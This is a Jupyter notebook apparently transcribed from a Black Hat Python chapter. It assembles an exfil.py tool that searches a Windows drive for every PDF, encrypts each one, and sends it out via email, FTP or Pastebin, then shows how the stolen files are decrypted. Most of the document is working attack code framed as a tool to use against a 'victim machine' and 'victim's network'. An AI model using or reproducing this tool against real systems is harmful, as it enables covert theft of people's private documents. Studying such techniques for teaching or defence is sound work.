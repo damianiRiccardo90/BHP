{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNpquRMKfHpd08++NiH/fVk",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C9-Fun_With_Exfiltration/Putting_It_All_Together.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Putting It All Together__*\n",
        "\n",
        "Finally, we tie our exfiltration methods together with __exfil.py__, which we can call to exfiltrate files by using any of the methods we've just written:"
      ],
      "metadata": {
        "id": "v95IgUYRzBed"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from cryptor import encrypt, decrypt #[1]\n",
        "from email_exfil import outlook, plain_email\n",
        "from transmit_exfil import plain_ftp, transmit\n",
        "from paste_exfil import ie_paste, plain_paste\n",
        "\n",
        "import os\n",
        "\n",
        "EXFIL = { #[2]\n",
        "    'outlook': outlook,\n",
        "    'plain_email': plain_email,\n",
        "    'plain_ftp': plain_ftp,\n",
        "    'transmit': transmit,\n",
        "    'ie_paste': ie_paste,\n",
        "    'plain_paste': plain_paste\n",
        "}"
      ],
      "metadata": {
        "id": "n9E1m9X1zVy_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "First, import the modules and functions you just wrote __[1]__. Then, create a dictionary called __EXFIL__ whose values correspond to the imported functions __[2]__. This will make calling the different exfiltration functions very easy. The values are the names of the functions, because, in Python, functions are first-class citizens and can be used as parameters. This technique is sometimes called __dictionary_dispatch__. It works much like a case statement in other languages.\n",
        "\n",
        "Now we need to create a function that will find the documents we want to exfiltrate:"
      ],
      "metadata": {
        "id": "yaeb-Xyqz4fw"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def find_docs(doc_type='.pdf'):\n",
        "    for parent, _, filenames in os.walk('c:\\\\'): #[2]\n",
        "        for filename in filenames:\n",
        "            if filename.endswith(doc_type):\n",
        "                document_path = os.path.join(parent, filename)\n",
        "                yield document_path #[2]"
      ],
      "metadata": {
        "id": "47YKN9V50z_e"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __find_docs__ generator walks the entire filesystem checking for PDF documents __[1]__. When it finds one, it returns the full path and yields back execution to the caller __[2]__.\n",
        "\n",
        "Next, we create the main function to orchestrate the exfiltration:"
      ],
      "metadata": {
        "id": "GYoxEUjx1Plo"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def exfiltrate(document_path, method): #[1]\n",
        "    if method in ['transmit', 'plain_ftp']: #[2]\n",
        "        filename = f'c:\\\\windws\\\\temp\\\\{os.path.basename(document_path)}'\n",
        "        with open(document_path, 'rb') as f0:\n",
        "            contents  = f0.read()\n",
        "        with open(filename, 'wb') as f1:\n",
        "            f1.write(encrypt(contents))\n",
        "\n",
        "        EXFIL[method](filename) #[3]\n",
        "        os.unlink(filename)\n",
        "    else:\n",
        "        with open(document_path, 'rb') as f: #[4]\n",
        "            contents = f.read()\n",
        "        title = os.path.basename(document_path)\n",
        "        contents = encrypt(contents)\n",
        "        EXFIL[method](title, contents) #[5]"
      ],
      "metadata": {
        "id": "oHsZZ-fs1xx3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We pass the __exfiltrate__ function the path to a document and the method of exfiltration we want to use __[1]__. When the method involves a file transfer (__transmit__ or __plain_ftp__), we need to provide an actual file, not an encoded string. In that case, we read in the file from its source, encrypt the contents, and write a new file into a temporary directory __[2]__. We call the __EXFIL__ dictionary to dispatch the corresponding method, passing in the new encrypted document path to exfiltrate the file __[3]__ and then remove the file from the temporary directory.\n",
        "\n",
        "For the other methods, we don't need to write a new file; instead, we need only to read the file to be exfiltrated __[4]__, encrypt its contents, and call the __EXFIL__ dictionary to email or paste the encrypted information __[5]__.\n",
        "\n",
        "In the main block, we iterate over all of the found documents. As a test, we exfiltrate them via the __plain_paste__ method, although you can choose any of the six functions we defined:"
      ],
      "metadata": {
        "id": "mK0acXkAsaC8"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "if __name__ == '__main__':\n",
        "    for fpath in find_docs():\n",
        "        exfiltrate(fpath, 'plain_paste')"
      ],
      "metadata": {
        "id": "RnIh9UgpuUB6"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Kicking the Tires__*\n",
        "\n",
        "There are a lot of moving parts to this code, but the tool is quite east to use.\n",
        "Simply run your __exfil.py__ script from a host and wait for it to indicate that it has successfully exfiltrated files via email, FTP, or Pastebin.\n",
        "\n",
        "If you left Internet Explorer visible while running the __paste_exfile.ie__ ____paste__ function, you should have been able to watch the whole process.\n",
        "\n",
        "After it's complete, you should be able to browse to your Pastebin page and see something like __Figure 9-1__.\n",
        "\n",
        "<div align=\"center\" width=\"100%\">\n",
        "<img src=\"https://github.com/damianiRiccardo90/BHP/blob/master/C9-Fun_With_Exfiltration/Exfiltrated_And_Encrypted_Data_On_Pastebin.png?raw=true\" alt=\"Starting A Live Passive Scan With Burp\" width=\"70%\">\n",
        "<p style=\"text-align:center\"><em>Figure 9-1: Exfiltrated and encrypted data on Pastebin</em></p>\n",
        "</div>\n",
        "\n",
        "Perfect! Our __exfil.py__ script picked up a PDF document called __topo_post.pdf__, encrypted the contents, and uploaded the contents to __pastebin.com__. We can successfully decrypt the file by downloading the paste and feeding it to the decryption function, as follows:"
      ],
      "metadata": {
        "id": "N1pl0xKiueZ8"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from cryptor import decrypt\n",
        "\n",
        "with open('topo_post_pdf.txt', 'rb') as f: #[1]\n",
        "    contents = f.read()\n",
        "with open('newtopo.pdf', 'wb') as f:\n",
        "    f.write(decrypt(contents)) #[2]"
      ],
      "metadata": {
        "id": "7YMeGdwIyB6_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "This snippet of code opens the downloaded paste file __[1]__, decrypts the contents, and writes the decrypted contents as a new file __[2]__. You can then open the new file with a PDF reader to view the topographic map that contains the original, decrypted map from the victim machine.\n",
        "\n",
        "You now have several tools for exfiltration in your toolbox. Which one you select will depend on the nature of your victim's network and the level of security used on that network."
      ],
      "metadata": {
        "id": "09Y7tdUQyWLu"
      }
    }
  ]
}